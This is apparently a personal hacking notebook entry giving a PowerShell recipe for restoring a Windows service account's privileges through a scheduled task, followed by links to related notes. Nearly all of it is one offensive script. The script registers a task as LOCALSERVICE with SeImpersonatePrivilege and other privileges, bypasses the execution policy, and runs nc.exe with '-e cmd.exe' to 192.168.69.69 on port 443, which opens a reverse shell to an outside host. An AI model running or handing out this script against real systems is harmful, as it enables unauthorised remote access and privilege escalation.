# service account privileges restore using scheduled task with powershell require seimpersonate privilege for task using principal
```powershell
# Create a list of privileges
[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseWorkingSetPrivilege"
# Create a Principal for the task 
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs
# Create an action for the task 
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\windows\temp\nc.exe 192.168.69.69 443 -e cmd.exe`""
# Create the task
Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal
# Start the task
Start-ScheduledTask -TaskName "GrantAllPerms"
```

` zet/20221003151078/README.md `

# Related

- [20221014185710](/zet/20221014185710/README.md) kb file named kb/hacking/windows/service-account-privileges.md
- [20221003151079](/zet/20221003151079/README.md) service account privileges restore using scheduled task with powershell
- ~/kb/hacking/windows/service-account-privileges.md
- [20221003151081](/zet/20221003151081/README.md) service account privileges

Tags:

    #hacking #windows #service 
